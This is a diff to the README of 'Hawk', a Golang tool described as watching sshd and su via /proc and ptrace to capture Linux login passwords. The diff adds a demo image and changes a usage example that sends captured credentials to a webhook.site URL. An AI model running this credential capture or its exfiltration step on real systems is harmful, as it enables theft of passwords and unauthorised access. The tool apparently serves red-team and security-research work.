@@ -7,6 +7,10 @@ Hawk
 
 Hawk is a lightweight Golang tool designed to monitor the `sshd` and `su` services for passwords on Linux systems. It reads the content of the proc directory to capture events, and ptrace to trace syscalls related to password-based authentication.
 
+## Demo
+
+![Example](example.gif)
+
 ## Blog Post
 https://www.prodefense.io/blog/hawks-prey-snatching-ssh-credentials
 
@@ -61,7 +65,7 @@ hostname=xxx username=xxx password=xxx
 
 **Webhook.site Example:**
 ```bash
-./hawk https://webhook.site/f436b722-284a-4f5f-9aa8-836677e56dcb
+./hawk https://webhook.site/f436b722-284a-4f5f-9aa8-1234567890
 ```
 
 ## Limitations
